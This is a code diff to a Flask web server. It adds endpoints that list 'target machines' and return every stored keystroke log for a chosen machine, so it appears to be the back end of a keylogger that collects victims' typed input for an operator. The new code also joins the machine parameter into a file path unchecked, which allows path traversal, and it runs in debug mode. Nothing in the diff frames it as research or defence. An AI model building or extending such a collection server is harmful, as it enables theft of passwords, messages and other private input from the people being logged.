@@ -37,6 +37,31 @@ def upload():
 
     return jsonify({"status": "success", "file": file_path}), 200
 
+
+@app.route('/api/get_target_machines_list', methods=['GET'])
+def get_target_machines_list():
+    machines = [x for x in os.listdir(DATA_FOLDER) if os.path.isdir(os.path.join(DATA_FOLDER, x))]
+    return jsonify({"machines": machines}), 200
+
+
+@app.route('/api/get_keystrokes', methods=['GET'])
+def get_keystrokes():
+    machine = request.args.get('machine')
+    if not machine:
+        return jsonify({"error": "Machine parameter is required"}), 400
+
+    machine_folder = os.path.join(DATA_FOLDER, machine)
+    if not os.path.exists(machine_folder):
+        return jsonify({"error": "Machine not found"}), 404
+
+    logs = {}
+    for filename in os.listdir(machine_folder):
+        file_path = os.path.join(machine_folder, filename)
+        with open(file_path, "r", encoding="utf-8") as f:
+            logs[filename] = f.read()
+
+    return jsonify({"logs": logs}), 200
+
 if __name__ == "__main__":
     app.run(debug=True)
 
